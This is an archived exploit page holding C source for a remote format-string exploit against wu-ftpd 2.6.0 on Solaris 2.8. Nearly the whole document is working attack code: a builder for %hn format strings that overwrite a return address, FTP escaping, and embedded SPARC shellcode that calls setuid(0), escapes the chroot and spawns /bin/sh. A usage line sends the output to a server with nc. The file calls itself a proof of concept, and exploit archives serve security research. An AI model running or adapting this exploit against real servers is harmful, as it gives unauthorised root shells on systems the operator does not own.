<html><head><title>wu-ftpd 2.6.0 Remote Format Strings Exploit</title></head><pre>/*
**
** 12:40 11/10/00: Tool for either  attack or defense
** within an information  warfare setting. Rather, it
** is a small program demonstrating proof of concept.
** Default values for solaris 2.8 and inetd.
**
** If you are not the intended recipient, or a person
** responsible  for  delivering  it  to  the intended
** recipient, you are not authorised to and  must not
** disclose, copy, distribute, or retain this message
** or any  part of it.  Such  unauthorised use may be
** unlawful.If you have received this transmission in
** error,please email us immediately at hert@hert.org
** so that we can arrange for its return.
**
**                                kalou &lt;pb@hert.org&gt;
**
** Usage:
** 
**    0xfdc (4060) bytes after the ret position, you have:
**
**     -HOSTNAME: anonymous/EGGSHELL
**
** This of course begins on a 4 bytes boundary.
**
** Check your hostname len. Align this with pad to have EGGSHELL on a
** 4 bytes boundary (-p). Localhost needs 2 bytes, for example.
**
** Use '%s' format bug exploitation to look for this string in memory.
** (you have to eat 15 words out of stack).
**
** Remove 0xfdc + len (-HOSTNAME: anonymous/pad) to your found pointer.
** This substracted value is kept as the distance (-d).
** Result is your return address position (-w). Check it if you want.
**
** This code substracts 8 to this address (sparc ret behaviour).
**
** You may use the 102th %p pointer on stack to find the string. eg: ffbef640.
**
** adding 0x870 to this value, I found my string.
**
** offset should be useless. site_padding depends on the '/bin/ftp-exec/' 
** config stuff.
**
** (./wu -p 2 -d 0xff4 ; cat ) | nc localhost 21
**
*/
/* Stolener  Foundation */


#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#ifdef  __linux
#include &lt;getopt.h&gt;
#endif

void *build_format_string(int where,
			  int what,
			  int gout,
			  int eat,
			  int pad)
{
  int expected_len;
  int what1, where1;
  int what2, where2;
  char w1[512];
  char w2[512];

  int  i;
  char *buf, *p;

  /* generate two %hn len : */

  what1 = (what &gt;&gt; 16) &amp; 0xffff;
  what2 = what &amp; 0xffff; 

  fprintf(stderr, &quot;what1: %0x\n&quot;, what1);
  fprintf(stderr, &quot;what2: %0x\n&quot;, what2);

  if ( what1 &gt; what2 ) {
    where1 = where + 2;
    where2 = where;
    what1 -= what2;
  } else {
    where1 = where;
    where2 = where + 2;
    what2 -= what1;
  }

  fprintf(stderr, &quot;removing %d.\n&quot;, pad + 2 * sizeof(where) + gout + 
	  (eat - 1) * 12);

  if (where1 &lt; where2) {
    what1 -= pad + 2 * sizeof(where) + (eat - 1) * 12 + gout;
  } else {
    what2 -= pad + 2 * sizeof(where) + (eat - 1) * 12 + gout;
  }

  fprintf(stderr, &quot;%08x: writing first %s\n&quot;, what,
	  (where1 &gt; where2) ? &quot;what2&quot; : &quot;what1&quot;);
  fprintf(stderr, &quot;what1 is %08x, what2 is %08x\n&quot;,
	  what1, what2);

  sprintf(w1, &quot;%%0%dx%%hn&quot;, what1);
  sprintf(w2, &quot;%%0%dx%%hn&quot;, what2);

  fprintf(stderr, &quot;1: %s\n2: %s\n&quot;, w1, w2);

  /* calculate expected len : */

  expected_len = pad + 12 + (eat - 1) * 8
	  + strlen(w1) + strlen(w2) + 1;

  fprintf(stderr, &quot;len is %d\n&quot;, expected_len);

  buf = (char *) malloc(expected_len);

  if ( buf == NULL) 
    return buf;

  p = buf;

  /* pad */
  for (i = 0; i &lt; pad; i++) {
    *p++ = '.';
  }

  /* retaddr, part 1 - first %hn*/
  *p++ = (where1 &gt;&gt; 24) &amp; 0xff;
  *p++ = (where1 &gt;&gt; 16) &amp; 0xff;
  *p++ = (where1 &gt;&gt; 8) &amp; 0xff;
  *p++ = (where1) &amp; 0xff;

  *p++ = 0x0f;
  *p++ = 0x0e;
  *p++ = 0x0e;
  *p++ = 0x0f; /* so that the first %0(much)x eats something

  /* retaddr, part 2 - second %hn */
  *p++ = ((where2) &gt;&gt; 24) &amp; 0xff;
  *p++ = ((where2) &gt;&gt; 16) &amp; 0xff;
  *p++ = ((where2) &gt;&gt; 8) &amp; 0xff;
  *p++ = (where2) &amp; 0xff;

  /* eaters.. */
  for (i = 0; i &lt; (eat - 1); i++) {
    strcpy(p, &quot;%000012x&quot;);
    p += 8;
  }

  /* what1, what2 */
  if (what1 &gt; what2) {
    strcpy(p, w1);
    strcpy(p + strlen(w1), w2);
  } else {
    strcpy(p, w2);
    strcpy(p + strlen(w2), w1);
  }


  return buf;
}

void *ftp_escape(void *buf)
{
  void *boh;
  char *p = buf;
  char *r;

  boh = malloc(4096);
  r = boh;

  while (*p) {
    *r++ = *p;
    if ((*p) == '\xff')
      *r++ = *p;
    p++;
  }
  *r = '\0';
  return boh;
}

void usage(char *me)
{
  fprintf(stderr, &quot;Usage : %s \n&quot;
	          &quot;     [-w where (hexa)  ] /* ret position */\n&quot;
		  &quot;   0 [-o offset        ] /* or just offset, or both */\n&quot;
	          &quot;1010 [-d distance (hex)] /* distance to pass */\n&quot;
		  &quot;   2 [-s site_pad      ] /* padding to site_exec */\n&quot;
		  &quot;   3 [-p pass_pad      ] /* padding to eggshell */\n&quot;
		  &quot;   4 [-g gout          ] /* output size (200-) */\n&quot;
		  &quot;  15 [-e eat           ] /* pointers to eat */\n\n\n&quot;,
		  me);
  exit(0);
}

main(int argc, char **argv)
{
  char c;
  int  where, offset, distance, gout, site_pad, pass_pad, eat;
  char *buf;
  char break_sparc[] =
	&quot;\x90\x1b\xc0\x0f&quot; // xor %o7, %o7, %o0
	&quot;\x82\x10\x20\x17&quot; // mov 23,  %g1
	&quot;\x91\xd0\x20\x08&quot; // ta  8                  ! setuid(0)
	&quot;\xae\x10\x20\x2e&quot; // mov 0x2e, %l7
	&quot;\xaf\x2d\xe0\x18&quot; // sll %l7, 24, %l7
	&quot;\xee\x23\xbf\xd0&quot; // st  %l7, [ %sp - 48 ]
	&quot;\x90\x23\xa0\x30&quot; // sub %sp, 48, %o0
	&quot;\x82\x10\x20\x05&quot; // mov 5, %g1
	&quot;\x92\x1b\xc0\x0f&quot; // xor %o7, %o7, %o1
	&quot;\x91\xd0\x20\x08&quot; // ta 8                   ! fd = open(&quot;.&quot;, 0);
	&quot;\xa6\x82\x20\x01&quot; // addcc %o0, 1, %l3      !
	&quot;\xae\x10\x20\x6b&quot; // mov 0x6b, %l7
	&quot;\xaf\x2d\xe0\x18&quot; // sll %l7, 24, %l7
	&quot;\xee\x23\xbf\xd0&quot; // st  %l7, [ %sp - 48 ]
	&quot;\x90\x23\xa0\x30&quot; // sub %sp, 48, %o0
	&quot;\x92\x10\x21\xff&quot; // mov 0x1ff, %o1
	&quot;\x82\x10\x20\x50&quot; // mov 0x50, %g1
	&quot;\x91\xd0\x20\x08&quot; // ta 8                   ! mkdir(&quot;k&quot;, 0755)
	&quot;\x90\x23\xa0\x30&quot; // sub %sp, 48, %o0
	&quot;\x82\x10\x20\x3d&quot; // mov 0x3d, %g1
	&quot;\x91\xd0\x20\x08&quot; // ta 8                   ! chroot(&quot;k&quot;)
	&quot;\x90\x24\xe0\x01&quot; // sub %l3, 1, %o0
	&quot;\x82\x10\x20\x78&quot; // mov 0x78, %g1
	&quot;\x91\xd0\x20\x08&quot; // ta 8                   ! fchdir(fd)
	&quot;\x2f\x0b\x8b\x8b&quot; // sethi %hi(0x2e2e2c00), %l7
	&quot;\xae\x15\xe3\x2e&quot; // or %l7, 0x32e, %l7
	&quot;\xee\x23\xbf\xd0&quot; // st %l7, [ %sp - 48 ]   ! ../.
	&quot;\x2f\x0b\xcb\x8b&quot; // sethi %hi(0x2f2e2c00), %l7
	&quot;\xae\x15\xe2\x2f&quot; // or %l7, 0x22f, %l7     
	&quot;\xee\x23\xbf\xd4&quot; // st %l7, [ %sp - 44 ]   ! /../
	&quot;\xee\x23\xbf\xd8&quot; // st %l7, [ %sp - 40 ]
	&quot;\xee\x23\xbf\xdc&quot; // st %l7, [ %sp - 36 ]
	&quot;\xee\x23\xbf\xe0&quot; // st %l7, [ %sp - 32 ]
	&quot;\xee\x23\xbf\xe4&quot; // st %l7, [ %sp - 28 ]
	&quot;\xee\x23\xbf\xe8&quot; // st %l7, [ %sp - 24 ]
	&quot;\xee\x23\xbf\xec&quot; // st %l7, [ %sp - 20 ]   ! .././..//..//../(ad lib)
	&quot;\xc0\x23\xbf\xf0&quot; // clr [ %sp - 16 ]
	&quot;\x82\x10\x20\x0c&quot; // mov 0xc, %g1
	&quot;\x90\x23\xa0\x30&quot; // sub %sp, 48, %o0
	&quot;\x91\xd0\x20\x08&quot; // ta 8                   ! chdir(&quot;.././../...&quot;)
	&quot;\xae\x10\x20\x2e&quot; // mov 0x2e, %l7
	&quot;\xaf\x2d\xe0\x18&quot; // sll %l7, 24, %l7
	&quot;\xee\x23\xbf\xd0&quot; // st %l7, [ %sp - 48 ]   ! stupido. anyway.
	&quot;\x90\x23\xa0\x30&quot; // sub %sp, 48, %o0
	&quot;\x82\x10\x20\x3d&quot; // mov 0x3d, %g1
	&quot;\x91\xd0\x20\x08&quot; // ta 8
	&quot;\x2d\x0b\xd8\x9a&quot; // sethi %hi(0x2f62696e), %l6  ! no more mine.
	&quot;\xac\x15\xa1\x6e&quot; // or %l6, %lo(0x2f62696e), %l6
	&quot;\x2f\x0b\xdc\xda&quot; // sethi %hi(0x2f736800), %l7
	&quot;\x90\x0b\x80\x0e&quot; // and %sp, %sp, %o0
	&quot;\x92\x03\xa0\x08&quot; // add %sp, 8, %o1
	&quot;\x94\x1b\xc0\x0f&quot; // xor %o7, %o7, %o2
	&quot;\x9c\x03\xa0\x10&quot; // add %sp, 16, %sp
	&quot;\xec\x3b\xbf\xf0&quot; // std %l6, [%sp-16]
	&quot;\xd0\x23\xbf\xf8&quot; // st %o0, [%sp-8]
	&quot;\xc0\x23\xbf\xfc&quot; // st %g0, [%sp-4]
	&quot;\x82\x10\x20\x3b&quot; // mov 59, %g1
	&quot;\x91\xd0\x20\x08&quot; // ta 8
	&quot;\x91\xd0\x20\x08&quot;; // ta 8          



  offset = 0;
  where = 0xffbeeed4;
  distance = 0x1004;
  gout = 4;
  eat = 15;
  site_pad = 2;
  pass_pad = 3;

  while ( ( c = getopt(argc, argv, &quot;w:o:d:e:g:s:p:&quot;) ) != EOF ) {
    switch(c) {
	    case 'w':
	      where = strtoul(optarg, NULL, 16);
	      break;
	    case 'o':
	      offset = atoi(optarg);
	      break;
	    case 'd':
	      distance = strtoul(optarg, NULL, 16);
	      break;
	    case 'e':
	      eat = atoi(optarg);
	      break;
	    case 'g':
	      gout = atoi(optarg);
	      break;
	    case 's':
	      site_pad = atoi(optarg) % 4;
	      break;
	    case 'p':
	      pass_pad = atoi(optarg) % 4;
	      break;
	    default:
	      usage(argv[0]);
    }
  }

  where += offset;

  fprintf(stderr, &quot;ret  [%x]:%x\n&quot;
	  	  &quot;ppad %d\n&quot;
		  &quot;spad %d\n&quot;
		  &quot;gout %d\n&quot;
		  &quot;eat  %d\n&quot;,
		  where, where + distance,
		  pass_pad, site_pad, gout, eat);

  printf(&quot;user ftp\n&quot;);

  buf = ftp_escape(break_sparc);
  printf(&quot;pass %.*s%s\n&quot;, pass_pad, &quot;xxxx&quot;, buf);
  
  buf = build_format_string(where, where + distance - 8, gout, eat, site_pad);
  buf = ftp_escape(buf);

  printf (&quot;site exec %s\n&quot;, buf);
}


// milw0rm.com [2001-01-03]</pre></html>